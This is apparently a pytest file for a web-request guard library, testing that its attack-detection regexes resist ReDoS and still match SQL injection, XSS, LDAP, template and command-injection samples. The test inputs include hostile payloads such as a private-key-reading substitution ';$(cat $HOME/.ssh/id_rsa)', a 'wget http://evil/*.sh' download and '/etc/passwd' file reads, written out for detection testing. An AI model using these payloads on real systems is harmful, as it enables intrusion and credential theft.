import itertools
import multiprocessing as mp
import re
import statistics
import time
from collections.abc import Callable

import pytest

from guard_core.detection_engine.compiler import PatternCompiler
from guard_core.handlers.suspatterns_handler import (
    _CMD_INJECTION_DOLLAR_SUBSTITUTION_RE,
    _DEFAULT_MAX_SCAN_LENGTH,
    _FILE_UPLOAD_DOUBLE_EXTENSION_RE,
    _GLOB_WILDCARD_ATOM_RE,
    _KNOWN_QUADRATIC_BUILTIN_PATTERNS_PENDING_B_XQ_FIX,
    _MEASUREMENT_BORDERLINE_BUILTIN_PATTERNS,
    _PATTERN_SCAN_WINDOW_MATCHERS,
    _SCAN_WINDOW_PATTERNS,
    _SQLI_LOAD_FILE_RE,
    _TEMPLATE_CURLY_CALL_RE,
    _TEMPLATE_CURLY_KEYWORD_RE,
    _TEMPLATE_DOLLAR_BRACE_CALL_RE,
    _WINDOWED_PATTERN_FINDERS,
    SusPatternsManager,
    _cmd_injection_dollar_scan_matches,
    _file_upload_double_extension_scan_matches,
    _glob_wildcard_scan_matches,
    _load_file_scan_matches,
    _template_curly_call_scan_matches,
    _template_curly_keyword_scan_matches,
    _template_dollar_brace_scan_matches,
)

IM = re.IGNORECASE | re.MULTILINE


def _child(pat: str, texts: list[str], q: "mp.Queue[list[float]]") -> None:
    compiled = re.compile(pat, IM)
    matcher = _SCAN_WINDOW_MATCHER_NAME_BY_PATTERN.get(pat)
    matcher_fn = _SCAN_WINDOW_MATCHERS[matcher] if matcher is not None else None
    times = []
    for text in texts:
        t0 = time.time()
        if matcher_fn is not None:
            matcher_fn(text, compiled)
        else:
            compiled.search(text)
        times.append(time.time() - t0)
    q.put(times)


def _timed_batch(pat: str, texts: list[str], timeout: float) -> list[float] | None:
    ctx = mp.get_context("forkserver")
    q: mp.Queue[list[float]] = ctx.Queue()
    p = ctx.Process(target=_child, args=(pat, texts, q))
    p.start()
    p.join(timeout)
    if p.is_alive():
        p.terminate()
        p.join()
        return None
    return q.get() if not q.empty() else [0.0] * len(texts)


_SCAN_WINDOW_MATCHERS = {
    "_load_file_scan_matches": _load_file_scan_matches,
    "_cmd_injection_dollar_scan_matches": _cmd_injection_dollar_scan_matches,
    "_file_upload_double_extension_scan_matches": (
        _file_upload_double_extension_scan_matches
    ),
    "_template_curly_keyword_scan_matches": _template_curly_keyword_scan_matches,
    "_template_dollar_brace_scan_matches": _template_dollar_brace_scan_matches,
    "_template_curly_call_scan_matches": _template_curly_call_scan_matches,
    "_glob_wildcard_scan_matches": _glob_wildcard_scan_matches,
}

_SCAN_WINDOW_MATCHER_NAME_BY_PATTERN = {
    pattern_text: matcher_fn.__name__
    for pattern_text, matcher_fn in _PATTERN_SCAN_WINDOW_MATCHERS.items()
}


def test_windowed_registries_share_no_pattern() -> None:
    assert set(_WINDOWED_PATTERN_FINDERS).isdisjoint(_PATTERN_SCAN_WINDOW_MATCHERS)


_SCAN_WINDOW_TIMING_RUNS = 5


def _scan_window_child(
    matcher_name: str,
    pattern_text: str,
    texts: list[str],
    runs: int,
    q: "mp.Queue[tuple[list[float], list[float]]]",
) -> None:
    compiled = re.compile(pattern_text, re.IGNORECASE)
    matcher = _SCAN_WINDOW_MATCHERS[matcher_name]
    mins = []
    medians = []
    for text in texts:
        samples = []
        for _ in range(runs):
            t0 = time.process_time()
            matcher(text, compiled)
            samples.append(time.process_time() - t0)
        samples.sort()
        mins.append(samples[0])
        medians.append(statistics.median(samples))
    q.put((mins, medians))


def _timed_scan_window_batch(
    matcher_name: str, pattern_text: str, texts: list[str], timeout: float
) -> tuple[list[float], list[float]] | None:
    ctx = mp.get_context("forkserver")
    q: mp.Queue[tuple[list[float], list[float]]] = ctx.Queue()
    p = ctx.Process(
        target=_scan_window_child,
        args=(matcher_name, pattern_text, texts, _SCAN_WINDOW_TIMING_RUNS, q),
    )
    p.start()
    p.join(timeout)
    if p.is_alive():
        p.terminate()
        p.join()
        return None
    return q.get() if not q.empty() else None


def linear_search_time(
    pattern: str, mk_input: Callable[[int], str], sizes: list[int], timeout: float = 2.0
) -> list[float | None]:
    texts = [mk_input(size) for size in sizes]
    results = _timed_batch(pattern, texts, timeout * len(sizes))
    if results is None:
        return [None] * len(sizes)
    return list(results)


_ADVERSARIAL_INPUTS: list[Callable[[int], str]] = [
    lambda n: "/" * n,
    lambda n: " " * n,
    lambda n: "<" * n,
    lambda n: "." * n,
    lambda n: "a" * n,
    lambda n: ("/x<. a" * (n // 6 + 1))[:n],
    lambda n: "SELECT " + " " * n,
    lambda n: "{{" * (n // 2),
    lambda n: "{%" * (n // 2),
    lambda n: "<%" * (n // 2),
    lambda n: ";" * n,
    lambda n: "|" * n,
    lambda n: "&" * n,
    lambda n: "\n" * n,
    lambda n: "\r" * n,
    lambda n: ("\nK=V " * (n // 5 + 1))[:n],
]


_RAW_SEARCH_SAFE_PATTERN_DEFINITIONS = [
    (pat, ctx, cat)
    for pat, ctx, cat in SusPatternsManager._pattern_definitions
    if pat not in _WINDOWED_PATTERN_FINDERS
    and pat not in _PATTERN_SCAN_WINDOW_MATCHERS
    and pat not in _SCAN_WINDOW_PATTERNS
]


@pytest.mark.parametrize("pat,_ctx,cat", _RAW_SEARCH_SAFE_PATTERN_DEFINITIONS)
def test_builtin_pattern_is_not_catastrophic(
    pat: str, _ctx: frozenset[str], cat: str
) -> None:
    texts = [mk(80000) for mk in _ADVERSARIAL_INPUTS]
    results = _timed_batch(pat, texts, timeout=6.0 * len(texts))
    assert results is not None, (
        f"{cat} pattern did not finish in 6s on some 80k adversarial input "
        f"(super-linear): {pat!r}"
    )


def _windowed_child(pat: str, texts: list[str], q: "mp.Queue[list[float]]") -> None:
    from guard_core.handlers.suspatterns_handler import _WINDOWED_PATTERN_FINDERS

    finder = _WINDOWED_PATTERN_FINDERS[pat]
    times = []
    for text in texts:
        t0 = time.time()
        list(finder(text))
        times.append(time.time() - t0)
    q.put(times)


def _timed_windowed_batch(
    pat: str, texts: list[str], timeout: float
) -> list[float] | None:
    ctx = mp.get_context("forkserver")
    q: mp.Queue[list[float]] = ctx.Queue()
    p = ctx.Process(target=_windowed_child, args=(pat, texts, q))
    p.start()
    p.join(timeout)
    if p.is_alive():
        p.terminate()
        p.join()
        return None
    return q.get() if not q.empty() else [0.0] * len(texts)


@pytest.mark.parametrize("pat", sorted(_WINDOWED_PATTERN_FINDERS))
def test_windowed_builtin_pattern_is_not_catastrophic(pat: str) -> None:
    texts = [mk(80000) for mk in _ADVERSARIAL_INPUTS]
    results = _timed_windowed_batch(pat, texts, timeout=6.0 * len(texts))
    assert results is not None, (
        f"windowed pattern did not finish in 6s on some 80k adversarial input "
        f"(super-linear): {pat!r}"
    )


def test_select_from_resists_repeated_anchor_padding() -> None:
    pat = next(
        p
        for p, _c, c in SusPatternsManager._pattern_definitions
        if c == "sqli" and "FROM" in p
    )
    sizes = [4000, 8000, 16000]
    times = linear_search_time(pat, lambda n: "SELECT " * (n // 7), sizes, timeout=2.0)
    assert all(t is not None for t in times), (
        f"repeated-SELECT-no-FROM input did not finish: {pat!r}"
    )
    first, last = times[0], times[-1]
    assert first is not None and last is not None
    ratio = last / first if first > 0 else 0.0
    assert ratio < 8.0, (
        f"repeated-SELECT-no-FROM input grew {ratio:.1f}x over a 4x size increase "
        f"(quadratic behavior): {pat!r} times={times}"
    )


def _compiled(cat: str, needle: str) -> re.Pattern:
    for pat, _c, c in SusPatternsManager._pattern_definitions:
        if c == cat and needle in pat:
            return re.compile(pat, IM)
    raise AssertionError(f"pattern not found: {cat}/{needle}")


def test_select_from_still_matches_real_sqli() -> None:
    rx = _compiled("sqli", "FROM")
    assert rx.search("SELECT username, password FROM users")
    assert rx.search("select * from accounts where 1=1")


def test_union_select_null_still_matches_real_sqli() -> None:
    rx = _compiled("sqli", r"NULL(?:[,\s]*NULL)*")
    assert rx.search("UNION SELECT NULL")
    assert rx.search("union all select null,null,null--")
    assert rx.search("(SELECT @@version)")
    assert rx.search("( select version())")


def test_quote_comment_matches_authentication_bypass() -> None:
    rx = _compiled("sqli", r"'\s*[\);]*\s*--|'[\);]*#(?:\n|\Z)")
    assert rx.search("admin'--")
    assert rx.search("1'--")
    assert rx.search("admin'#")
    assert rx.search("admin')--")
    assert rx.search("1'; --")
    assert rx.search("admin'-- -")


def test_quote_comment_ignores_quoted_fragments_and_prose() -> None:
    rx = _compiled("sqli", r"'\s*[\);]*\s*--|'[\);]*#(?:\n|\Z)")
    assert not rx.search("document.querySelector('#app')")
    assert not rx.search("href='#top'")
    assert not rx.search("I'll select a few items from the catalog")
    assert not rx.search("O'Brien")


def test_union_select_null_resists_unterminated_separator_padding() -> None:
    rx = _compiled("sqli", r"NULL(?:[,\s]*NULL)*")
    sizes = [4000, 8000, 16000]
    times = linear_search_time(
        rx.pattern, lambda n: "UNION SELECT NULL" + ", " * n, sizes, timeout=2.0
    )
    assert all(t is not None for t in times), (
        f"unterminated-separator-padding input did not finish: {rx.pattern!r}"
    )
    first, last = times[0], times[-1]
    assert first is not None and last is not None
    ratio = last / first if first > 0 else 0.0
    assert ratio < 8.0, (
        f"unterminated-separator-padding input grew {ratio:.1f}x over a 4x size "
        f"increase (quadratic behavior): {rx.pattern!r} times={times}"
    )


def test_recon_ext_still_matches_real_probe() -> None:
    rx = _compiled("recon", r"(?:asp|aspx")
    assert rx.search("/admin/config.aspx")
    assert rx.search("/shell.jsp?x=1")


@pytest.mark.parametrize(
    "path",
    [
        "/report.final.jsp",
        "/backup.2024.jsp",
        "/app.v1.2.do",
        "/db.dump.cgi",
        "/web.config.bak.jsp",
    ],
)
def test_recon_ext_still_matches_multidot_filenames(path: str) -> None:
    rx = _compiled("recon", r"(?:asp|aspx")
    assert rx.search(path), f"multi-dot recon probe regressed: {path}"


def test_xss_href_javascript_still_matches_real_attack() -> None:
    rx = _compiled("xss", "href|src|data|action")
    assert rx.search('<a href="javascript:alert(1)">click</a>')
    assert rx.search('<img src="x" onerror="alert(1)" href="javascript:alert(2)">')


def test_xss_href_javascript_resists_padding_evasion() -> None:
    rx = _compiled("xss", "href|src|data|action")
    padded = "<a " + ('data-x="junk" ' * 30) + 'href="javascript:alert(1)">'
    assert len(padded) - len("<a ") > 256, "padding must exceed the old 256-char bound"
    assert rx.search(padded), "padded attack evaded detection"


def test_xss_style_expression_still_matches_real_attack() -> None:
    rx = _compiled("xss", "expression|behavior|url")
    assert rx.search('<div style="width:expression(alert(1))">')


def test_xss_style_expression_resists_padding_evasion() -> None:
    rx = _compiled("xss", "expression|behavior|url")
    padded = '<div style="' + ("color:red;" * 40) + 'width:expression(alert(1))">'
    assert len(padded) > 256, "padding must exceed the old 256-char bound"
    assert rx.search(padded), "padded attack evaded detection"


def test_xss_style_expression_does_not_cross_into_unrelated_attribute() -> None:
    rx = _compiled("xss", "expression|behavior|url")
    benign = '<div style="color:red" title="see url(icon.png) for reference">'
    assert not rx.search(benign), "matched a url( token in an unrelated attribute"


def test_xss_event_handler_still_matches_real_attack() -> None:
    rx = _compiled("xss", "(?<!=)")
    assert rx.search('<img src=x onerror="alert(1)">')
    assert rx.search('<a onclick="alert(1)">')
    assert rx.search("<img src=x onerror= alert(1)>")


def _quadratic_resistant(
    pat: str, mk_input: Callable[[int], str], sizes: list[int]
) -> None:
    times = linear_search_time(pat, mk_input, sizes, timeout=4.0)
    assert all(t is not None for t in times), (
        f"adversarial input did not finish: {pat[:80]!r} times={times}"
    )
    first, last = times[0], times[-1]
    assert first is not None and last is not None
    ratio = last / first if first > 0 else 0.0
    assert ratio < 8.0, (
        f"adversarial input grew {ratio:.1f}x over a 4x size increase "
        f"(quadratic behavior): {pat[:80]!r} times={times}"
    )


def test_xss_event_handler_resists_separator_padding() -> None:
    rx = _compiled("xss", "(?<!=)")
    sizes = [4000, 8000, 16000]
    _quadratic_resistant(rx.pattern, lambda n: "<a" + " " * n, sizes)
    _quadratic_resistant(rx.pattern, lambda n: "<a" + "/" * n, sizes)


def test_xss_href_javascript_resists_separator_padding() -> None:
    rx = _compiled("xss", "href|src|data|action")
    sizes = [4000, 8000, 16000]
    _quadratic_resistant(rx.pattern, lambda n: "<a" + " " * n, sizes)


def test_xss_style_expression_resists_separator_padding() -> None:
    rx = _compiled("xss", "expression|behavior|url")
    sizes = [4000, 8000, 16000]
    _quadratic_resistant(rx.pattern, lambda n: '<div style="' + " " * n, sizes)


def _file_upload_patterns() -> list[str]:
    return [
        pat
        for pat, _c, cat in SusPatternsManager._pattern_definitions
        if cat == "file_upload"
    ]


def test_file_upload_patterns_resist_unclosed_filename_padding() -> None:
    assert len(_file_upload_patterns()) == 4
    sizes = [4000, 8000, 16000]

    def mk(n: int) -> str:
        unit = 'filename="AAAAAAAAAA'
        body = (unit * (n // len(unit) + 1))[: n - 1]
        return body + '"'

    for pat in _file_upload_patterns():
        _quadratic_resistant(pat, mk, sizes)


def test_file_upload_scan_window_bounds_to_last_quote() -> None:
    from guard_core.handlers.suspatterns_handler import _file_upload_scan_window

    assert _file_upload_scan_window('filename="a.php"tail') == 'filename="a.php"'
    assert _file_upload_scan_window("no quotes at all here") == ""
    assert _file_upload_scan_window("") == ""
    assert _file_upload_scan_window("filename='a.php'") == "filename='a.php'"


def test_recon_secrets_still_matches_bare_filename() -> None:
    rx = _compiled("recon", "secrets?|credentials?")
    assert rx.search("/secrets.json")
    assert rx.search("/app/config/credentials.yml")


@pytest.mark.parametrize(
    "path",
    [
        "/my.secrets.json",
        "/db.credentials.env",
        "/backup.old.secrets.json",
    ],
)
def test_recon_secrets_still_matches_multidot_filenames(path: str) -> None:
    rx = _compiled("recon", "secrets?|credentials?")
    assert rx.search(path), f"multi-dot secrets probe regressed: {path}"


@pytest.mark.parametrize(
    "path",
    [
        "/static/js/main.abc123.js.map",
    ],
)
def test_sensitive_file_map_still_matches_multidot_filenames(path: str) -> None:
    rx = _compiled("sensitive_file", r"\.map")
    assert rx.search(path), f"multi-dot source-map probe regressed: {path}"


@pytest.mark.parametrize(
    "path",
    [
        "/legacy.v2.old.py",
    ],
)
def test_sensitive_file_source_still_matches_multidot_filenames(path: str) -> None:
    rx = _compiled("sensitive_file", "ts|tsx|jsx")
    assert rx.search(path), f"multi-dot source-file probe regressed: {path}"


_SENSITIVE_FILE_CONFIG_OLD_PATTERN = (
    r"\A[/\\]?(?:[\w.\-~%]+[/\\])*"
    r"[\w-]*config[\w-]*\.(?:env|yml|yaml|json|toml|ini|xml|conf)"
    r"(?:[/\\][\w.\-~%]*)*(?:\?\S*)?\s*\Z"
)


@pytest.mark.parametrize(
    "path",
    [
        "config.yml",
        "config.json",
        "app-config.yaml",
        "site_config.toml",
        "my-config-old.ini",
        "webconfig.xml",
        "src-config-cache.yml",
        "staging-config.env",
        "docker-config.conf",
        "config-log.yml",
        "cache-config-cache.json",
        "configconfig.yml",
        "myconfigconfig-old.toml",
        "/etc/app/config.yml",
        "app/src/config-backup.json",
        "gconfig.yml",
        "configg.yml",
        "configuration.yml",
    ],
)
def test_sensitive_file_config_still_matches_real_filenames(path: str) -> None:
    rx = _compiled("sensitive_file", "config")
    assert rx.search(path), f"real config-file probe regressed: {path}"


@pytest.mark.parametrize(
    "path",
    [
        "settings.yml",
        "database.json",
        "readme.env",
        "config.txt",
    ],
)
def test_sensitive_file_config_does_not_match_unrelated_filenames(path: str) -> None:
    rx = _compiled("sensitive_file", "config")
    assert not rx.search(path), f"unrelated filename falsely flagged: {path}"


def test_sensitive_file_config_resists_repeated_literal_padding() -> None:
    rx = _compiled("sensitive_file", "config")
    sizes = [16000, 32000, 64000]

    def mk(n: int) -> str:
        unit = "config"
        return (unit * (n // len(unit) + 1))[:n]

    _quadratic_resistant(rx.pattern, mk, sizes)


def test_sensitive_file_config_rewrite_matches_original_language() -> None:
    rx_new = _compiled("sensitive_file", "config")
    rx_old = re.compile(_SENSITIVE_FILE_CONFIG_OLD_PATTERN, re.IGNORECASE)

    corpus = [
        "config.yml",
        "config.json",
        "app-config.yaml",
        "site_config.toml",
        "my-config-old.ini",
        "webconfig.xml",
        "src-config-cache.yml",
        "staging-config.env",
        "docker-config.conf",
        "config-log.yml",
        "cache-config-cache.json",
        "configconfig.yml",
        "myconfigconfig-old.toml",
        "/etc/app/config.yml",
        "app/src/config-backup.json",
        "gconfig.yml",
        "configg.yml",
        "configuration.yml",
        "settings.yml",
        "database.json",
        "readme.env",
        "config.txt",
        "config",
        "config.yml.bak",
        "a-config-b-config-c.yml",
        "CONFIG.YML",
        "Config.Env",
    ]
    letters = "cognifx-"
    for prefix_len in range(3):
        for suffix_len in range(3):
            for prefix_chars in itertools.product(letters, repeat=prefix_len):
                for suffix_chars in itertools.product(letters, repeat=suffix_len):
                    prefix = "".join(prefix_chars)
                    suffix = "".join(suffix_chars)
                    corpus.append(f"{prefix}config{suffix}.yml")

    mismatches = []
    for text in corpus:
        old_result = bool(rx_old.search(text))
        new_result = bool(rx_new.search(text))
        if old_result != new_result:
            mismatches.append((text, old_result, new_result))

    assert not mismatches, "rewrite diverged from original on:\n" + "\n".join(
        f"  {t!r}: old={o} new={n}" for t, o, n in mismatches[:20]
    )


def test_ldap_conjunction_wildcard_matches_attack_shapes() -> None:
    rx = _compiled("ldap", "[|&]")
    assert rx.search("(|(cn=*)")
    assert rx.search("(&(uid=*)")


@pytest.mark.parametrize(
    "attr",
    [
        "cn",
        "uid",
        "mail",
        "objectClass",
        "sAMAccountName",
        "member-Of",
        "distinguishedName",
        "employee-ID-2",
    ],
)
def test_ldap_conjunction_wildcard_matches_rfc4512_attribute_names(attr: str) -> None:
    rx = _compiled("ldap", "[|&]")
    assert rx.search(f"(|({attr}=*)"), f"real LDAP attribute regressed: {attr}"
    assert rx.search(f"(&({attr}=*)"), f"real LDAP attribute regressed: {attr}"


def test_ldap_conjunction_wildcard_resists_unclosed_paren_padding() -> None:
    rx = _compiled("ldap", "[|&]")
    sizes = [16000, 32000, 64000]

    def mk(n: int) -> str:
        unit = "(|("
        return (unit * (n // len(unit) + 1))[:n]

    _quadratic_resistant(rx.pattern, mk, sizes)


def test_sqli_load_file_still_matches_nested_mysql_call() -> None:
    compiled = re.compile(_SQLI_LOAD_FILE_RE, re.IGNORECASE)
    matches = _load_file_scan_matches(
        "LOAD_FILE(CONCAT(0x2f6574632f706173737764))", compiled
    )
    assert len(matches) == 1
    assert matches[0].group() == "LOAD_FILE(CONCAT(0x2f6574632f706173737764)"


def test_sqli_load_file_still_matches_real_attack() -> None:
    compiled = re.compile(_SQLI_LOAD_FILE_RE, re.IGNORECASE)
    assert _load_file_scan_matches("LOAD_FILE('/etc/passwd')", compiled)
    assert _load_file_scan_matches("load_file(0x2f6574632f706173737764)", compiled)


def _assert_scan_window_linear_and_fast(
    result: tuple[list[float], list[float]] | None, label: str
) -> None:
    assert result is not None, f"{label} scan window did not finish in time"
    mins, medians = result
    assert mins[-1] < 0.05, (
        f"{label} exceeded 50ms (min of {_SCAN_WINDOW_TIMING_RUNS} CPU-time runs) "
        f"at the largest size: mins={mins}"
    )
    ratio = mins[-1] / mins[0] if mins[0] > 0 else 0.0
    assert ratio < 6.0, (
        f"{label} grew {ratio:.1f}x over a 4x size increase (min-of-"
        f"{_SCAN_WINDOW_TIMING_RUNS} CPU time): mins={mins} medians={medians}"
    )


def test_sqli_load_file_resists_repeated_literal_padding() -> None:
    sizes = [65536, 131072, 262144]

    def mk(n: int) -> str:
        unit = "LOAD_FILE("
        return (unit * (n // len(unit) + 1))[:n]

    texts = [mk(n) for n in sizes]
    result = _timed_scan_window_batch(
        "_load_file_scan_matches", _SQLI_LOAD_FILE_RE, texts, timeout=4.0
    )
    _assert_scan_window_linear_and_fast(result, "sqli LOAD_FILE")


def test_cmd_injection_dollar_still_matches_embedded_dollar_variable() -> None:
    compiled = re.compile(_CMD_INJECTION_DOLLAR_SUBSTITUTION_RE, re.IGNORECASE)
    matches = _cmd_injection_dollar_scan_matches(";$(cat $HOME/.ssh/id_rsa)", compiled)
    assert len(matches) == 1
    assert matches[0].group() == ";$(cat $HOME/.ssh/id_rsa)"


def test_cmd_injection_dollar_still_matches_brace_form() -> None:
    compiled = re.compile(_CMD_INJECTION_DOLLAR_SUBSTITUTION_RE, re.IGNORECASE)
    matches = _cmd_injection_dollar_scan_matches(";${HOME}", compiled)
    assert len(matches) == 1
    assert matches[0].group() == ";${HOME}"


def test_cmd_injection_dollar_still_matches_nested_brace_inside_paren() -> None:
    compiled = re.compile(_CMD_INJECTION_DOLLAR_SUBSTITUTION_RE, re.IGNORECASE)
    matches = _cmd_injection_dollar_scan_matches(";$(echo ${HOME}/file)", compiled)
    assert len(matches) == 1
    assert matches[0].group() == ";$(echo ${HOME}/file)"


def test_cmd_injection_dollar_resists_repeated_literal_padding() -> None:
    sizes = [65536, 131072, 262144]

    for unit in (";$(", ";${"):

        def mk(n: int, unit: str = unit) -> str:
            return (unit * (n // len(unit) + 1))[:n]

        texts = [mk(n) for n in sizes]
        result = _timed_scan_window_batch(
            "_cmd_injection_dollar_scan_matches",
            _CMD_INJECTION_DOLLAR_SUBSTITUTION_RE,
            texts,
            timeout=4.0,
        )
        _assert_scan_window_linear_and_fast(result, f"cmd_injection dollar {unit!r}")


def test_file_upload_double_extension_still_matches_real_attacks() -> None:
    compiled = re.compile(_FILE_UPLOAD_DOUBLE_EXTENSION_RE, re.IGNORECASE)
    assert _file_upload_double_extension_scan_matches(
        'filename="shell.php.jpg"', compiled
    )
    assert _file_upload_double_extension_scan_matches(
        "filename='shell.php.jpg'", compiled
    )
    assert not _file_upload_double_extension_scan_matches(
        'filename="invoice.pdf"', compiled
    )
    assert not _file_upload_double_extension_scan_matches(
        'filename="report.php"', compiled
    )


def test_file_upload_double_extension_finds_attack_before_later_benign_field() -> None:
    compiled = re.compile(_FILE_UPLOAD_DOUBLE_EXTENSION_RE, re.IGNORECASE)
    matches = _file_upload_double_extension_scan_matches(
        'filename="a.php.jpg" filename="b.pdf"', compiled
    )
    assert len(matches) == 1
    assert matches[0].group() == 'filename="a.php.jpg"'


def test_file_upload_double_extension_resists_unclosed_repeated_extension_padding() -> (
    None
):
    sizes = [65536, 131072, 262144]

    def mk(n: int) -> str:
        prefix = 'filename="'
        body = ".php" * ((n - len(prefix)) // 4 + 1)
        return (prefix + body)[:n]

    texts = [mk(n) for n in sizes]
    result = _timed_scan_window_batch(
        "_file_upload_double_extension_scan_matches",
        _FILE_UPLOAD_DOUBLE_EXTENSION_RE,
        texts,
        timeout=4.0,
    )
    _assert_scan_window_linear_and_fast(result, "file_upload double-extension")


def test_template_curly_keyword_still_matches_real_attack() -> None:
    compiled = re.compile(_TEMPLATE_CURLY_KEYWORD_RE, re.IGNORECASE)
    assert _template_curly_keyword_scan_matches("{{ x;system }}", compiled)
    assert not _template_curly_keyword_scan_matches("{{ name }}", compiled)


def test_template_curly_keyword_detects_padding_past_old_256_cap() -> None:
    compiled = re.compile(_TEMPLATE_CURLY_KEYWORD_RE, re.IGNORECASE)
    padding = "b " * 130
    text = "{{ " + padding + "system }}"
    assert len(padding) > 256
    assert _template_curly_keyword_scan_matches(text, compiled)


def test_template_curly_keyword_resists_repeated_literal_padding() -> None:
    sizes = [65536, 131072, 262144]

    def mk(n: int) -> str:
        prefix = "{{ "
        return (prefix + "a" * n)[:n]

    texts = [mk(n) for n in sizes]
    result = _timed_scan_window_batch(
        "_template_curly_keyword_scan_matches",
        _TEMPLATE_CURLY_KEYWORD_RE,
        texts,
        timeout=4.0,
    )
    _assert_scan_window_linear_and_fast(result, "template curly keyword")


def test_template_dollar_brace_still_matches_real_attack() -> None:
    compiled = re.compile(_TEMPLATE_DOLLAR_BRACE_CALL_RE, re.IGNORECASE)
    assert _template_dollar_brace_scan_matches("${7*7}", compiled)
    assert _template_dollar_brace_scan_matches("${@java.lang.Runtime@}", compiled)
    assert not _template_dollar_brace_scan_matches("${amount}", compiled)


def test_template_dollar_brace_resists_repeated_literal_padding() -> None:
    sizes = [65536, 131072, 262144]

    def mk(n: int) -> str:
        prefix = "${"
        return (prefix + "a" * n)[:n]

    texts = [mk(n) for n in sizes]
    result = _timed_scan_window_batch(
        "_template_dollar_brace_scan_matches",
        _TEMPLATE_DOLLAR_BRACE_CALL_RE,
        texts,
        timeout=4.0,
    )
    _assert_scan_window_linear_and_fast(result, "template dollar-brace")


def test_template_curly_call_still_matches_real_attack() -> None:
    compiled = re.compile(_TEMPLATE_CURLY_CALL_RE, re.IGNORECASE)
    assert _template_curly_call_scan_matches("{{7*7}}", compiled)
    assert _template_curly_call_scan_matches("{{config.items()}}", compiled)
    assert not _template_curly_call_scan_matches("{{name}}", compiled)


def test_template_curly_call_resists_repeated_literal_padding() -> None:
    sizes = [65536, 131072, 262144]

    def mk(n: int) -> str:
        prefix = "{{"
        return (prefix + "a" * n)[:n]

    texts = [mk(n) for n in sizes]
    result = _timed_scan_window_batch(
        "_template_curly_call_scan_matches",
        _TEMPLATE_CURLY_CALL_RE,
        texts,
        timeout=4.0,
    )
    _assert_scan_window_linear_and_fast(result, "template curly call")


def test_glob_wildcard_still_matches_real_attacks() -> None:
    compiled = re.compile(_GLOB_WILDCARD_ATOM_RE, re.IGNORECASE)
    matches = _glob_wildcard_scan_matches("rm -rf /tmp/*.log", compiled)
    assert [m.group() for m in matches] == ["/tmp/*.log"]
    matches = _glob_wildcard_scan_matches("wget http://evil/*.sh", compiled)
    assert [m.group() for m in matches] == ["//evil/*.sh"]


def test_glob_wildcard_does_not_match_plain_text() -> None:
    compiled = re.compile(_GLOB_WILDCARD_ATOM_RE, re.IGNORECASE)
    assert not _glob_wildcard_scan_matches("ls file.txt", compiled)
    assert not _glob_wildcard_scan_matches("the quick brown fox", compiled)


def test_glob_wildcard_detects_run_past_old_100_char_cap() -> None:
    compiled = re.compile(_GLOB_WILDCARD_ATOM_RE, re.IGNORECASE)
    text = "a" * 150 + "?" + "b" * 150
    matches = _glob_wildcard_scan_matches(text, compiled)
    assert len(matches) == 1
    assert matches[0].group() == text


def test_glob_wildcard_resists_no_wildcard_adversarial_fill() -> None:
    sizes = [65536, 131072, 262144]
    texts = ["a" * n for n in sizes]
    result = _timed_scan_window_batch(
        "_glob_wildcard_scan_matches", _GLOB_WILDCARD_ATOM_RE, texts, timeout=4.0
    )
    _assert_scan_window_linear_and_fast(result, "cmd_injection glob wildcard")


@pytest.mark.parametrize(
    "path",
    [
        "/site.v1.2.bak",
    ],
)
def test_cms_probing_backup_still_matches_multidot_filenames(path: str) -> None:
    rx = _compiled("cms_probing", "bak|backup|old")
    assert rx.search(path), f"multi-dot backup probe regressed: {path}"


@pytest.mark.redos_timing
def test_every_builtin_not_in_the_known_quadratic_set_passes_the_safety_validator() -> (
    None
):
    pc = PatternCompiler()
    bad = []
    for pat, _c, cat in _RAW_SEARCH_SAFE_PATTERN_DEFINITIONS:
        if (
            pat in _KNOWN_QUADRATIC_BUILTIN_PATTERNS_PENDING_B_XQ_FIX
            or pat in _MEASUREMENT_BORDERLINE_BUILTIN_PATTERNS
        ):
            continue
        ok, reason = pc.validate_pattern_safety(pat)
        if not ok:
            bad.append((cat, reason, pat))
    assert not bad, "built-ins that fail the ReDoS validator:\n" + "\n".join(
        f"  [{c}] {r} :: {p[:80]}" for c, r, p in bad
    )


def _file_inclusion_url_pattern() -> str:
    for pat, _c, c in SusPatternsManager._pattern_definitions:
        if c == "file_inclusion" and "(?<!:)" in pat:
            return pat
    raise AssertionError("file_inclusion URL pattern not found")


def test_hostname_fragment_not_catastrophic_with_failing_tail() -> None:
    pat = _file_inclusion_url_pattern()
    frag_match = re.search(r"\((?:\?:)?[^()]*[-.\\w][^()]*\)[*?]", pat)
    assert frag_match is not None, "hostname group not found in URL pattern"
    fragment = frag_match.group(0)
    assert not fragment.endswith("*"), (
        f"hostname group still has outer * (nested unbounded quantifier): {fragment}"
    )
    probe = fragment.rstrip("?") + r"$"
    results = _timed_batch(probe, ["a" * 25 + "!"], timeout=1.0)
    assert results is not None, (
        f"hostname fragment timed out with failing tail: {probe}"
    )


async def test_match_path_caps_input_length_in_legacy_mode() -> None:
    mgr = SusPatternsManager()
    original_preprocessor = mgr._preprocessor
    mgr._preprocessor = None

    try:
        big = "A" * 5_000_000
        capped, decode_budget_exhausted = await mgr._preprocess_content(big, None)

        cap = getattr(
            mgr._config, "detection_max_content_length", _DEFAULT_MAX_SCAN_LENGTH
        )
        assert len(capped) == min(len(big), cap)
        assert len(capped) < len(big)
        assert decode_budget_exhausted is False
    finally:
        mgr._preprocessor = original_preprocessor


def test_builtin_patterns_compile_without_multiline() -> None:
    manager = SusPatternsManager()
    for compiled, _contexts, _category in manager.compiled_patterns:
        assert not compiled.flags & re.MULTILINE, compiled.pattern[:60]


async def test_custom_patterns_keep_multiline_for_compatibility() -> None:
    manager = SusPatternsManager()
    await manager.add_pattern(r"line-anchored-custom-token$", custom=True)
    try:
        custom_compiled = [
            compiled
            for compiled, _contexts, category in manager.compiled_custom_patterns
            if category == "custom"
        ]
        assert custom_compiled
        assert all(c.flags & re.MULTILINE for c in custom_compiled)
    finally:
        await manager.remove_pattern(r"line-anchored-custom-token$", custom=True)
